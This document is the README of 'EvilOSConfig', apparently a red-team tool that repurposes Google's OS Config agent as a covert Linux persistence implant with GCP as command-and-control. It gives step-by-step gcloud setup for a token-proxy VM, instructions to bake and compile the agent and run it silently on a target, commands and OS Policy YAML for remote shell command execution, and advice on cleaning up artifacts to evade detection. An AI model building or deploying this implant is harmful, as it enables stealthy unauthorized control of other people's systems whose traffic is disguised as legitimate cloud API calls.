# EvilOSConfig

Modified version of Google's official OS Config Agent, designed for Linux persistence using GCP infrastructure as C2.

All C2 traffic goes to `*.googleapis.com:443` (gRPC/TLS) — indistinguishable from legitimate GCP API calls.

## How It Works

The GCP OS Config agent connects to `osconfig.googleapis.com` via gRPC, registers itself, and waits for tasks (OS Policies, patch jobs). Tasks can include `ExecResource` — arbitrary shell script execution.

The agent authenticates using a GCE instance identity token from the metadata server. We proxy a real GCE instance's metadata server to provide valid tokens.

```
Target Machine                          GCE e2-micro (~$5/mo)
┌────────────────────┐                 ┌─────────────────┐
│ evilosconfig       │──HTTP:8080─────▶│ metadata-proxy   │
│ (baked proxy addr) │                 │ → 169.254.169.254│
└────────┬───────────┘                 └─────────────────┘
         │ gRPC/TLS :443
         ▼
  osconfig.googleapis.com ← operator sends OS Policy here
```

## Prerequisites

- GCP account with billing enabled
- `gcloud` CLI installed and authenticated
- Go 1.21+ installed on build machine

## Setup

### 0. Enable APIs

```bash
gcloud config set project <YOUR_PROJECT>
gcloud services enable compute.googleapis.com osconfig.googleapis.com
```

### 1. Create GCE Token Proxy

```bash
# Create the metadata proxy instance
gcloud compute instances create osconfig-token-proxy \
  --zone=us-central1-a \
  --machine-type=e2-micro \
  --image-family=debian-12 \
  --image-project=debian-cloud \
  --metadata-from-file=startup-script=poc/metadata-proxy.py \
  --tags=metadata-proxy \
  --scopes=cloud-platform

# Allow port 8080
gcloud compute firewall-rules create allow-metadata-proxy \
  --allow=tcp:8080 --target-tags=metadata-proxy

# Stop the real OS Config agent on the proxy VM
gcloud compute ssh osconfig-token-proxy --zone=us-central1-a \
  --command="sudo systemctl stop google-osconfig-agent"
```

Note the external IP from the output.

### 2. Bake + Compile

```bash
# Hardcode the proxy address into the agent
python3 evilosconfig-controller.py bake <GCE_EXTERNAL_IP>:8080

# Build (--trim removes unnecessary deps: 88MB → 34MB)
python3 evilosconfig-controller.py compile --trim -o evilosconfig
```

### 3. Deploy + Run

Copy `evilosconfig` to the target and run it. No arguments, no env vars, no config files needed.

```bash
# Linux
./evilosconfig
```

The agent registers with GCP and waits for commands silently.

## Usage

### Send a Command

```bash
python3 evilosconfig-controller.py runcmd -z us-central1-a "id && hostname && whoami"
```

This deploys a temporary OS Policy with your command, waits for execution, then auto-deletes the policy.

Output is retrieved automatically from the OS Policy compliance report API.

### Manual OS Policy

For more control, deploy an OS Policy YAML directly:

```yaml
# policy.yaml
osPolicies:
  - id: run-cmd
    mode: ENFORCEMENT
    resourceGroups:
      - resources:
          - id: exec
            exec:
              validate:
                interpreter: SHELL
                script: "exit 101"  # always triggers enforce
              enforce:
                interpreter: SHELL
                script: |
                  whoami && id && hostname
                  exit 0
instanceFilter:
  all: true
rollout:
  disruptionBudget:
    fixed: 1
  minWaitDuration: 0s
```

```bash
gcloud compute os-config os-policy-assignments create my-cmd \
  --location=us-central1-a --file=policy.yaml
```

### Unbake (Restore Source)

```bash
python3 evilosconfig-controller.py unbake
```

## Artifacts

The agent creates state files on disk. Clean up after operations:

- Linux: `/var/lib/google_osconfig_agent/*`

## vs EvilSSM

| | EvilSSM (AWS) | EvilOSConfig (GCP) |
|---|---|---|
| Code changes | ~500 lines | 2 lines (via controller) |
| External infra | None (Hybrid Activation) | GCE e2-micro (~$5/mo) |
| Interactive shell | Yes (SSM Session) | No (script-only) |
| Binary size | ~25 MB | 34 MB (trimmed) |
| Output retrieval | Inline (RunCommand stdout) | Inline (compliance report `errorMessage`) |
| C2 traffic | `*.amazonaws.com:443` | `*.googleapis.com:443` |

---

# Google OS Config Agent

This repository contains the OS Config agent and associated end to end tests.

The OS Config agent currently supports the following three main features:
- [OS inventory management](https://cloud.google.com/compute/docs/instances/os-inventory-management)
- [Patch](https://cloud.google.com/compute/docs/os-patch-management)
- [OS policies](https://cloud.google.com/compute/docs/os-config-management)
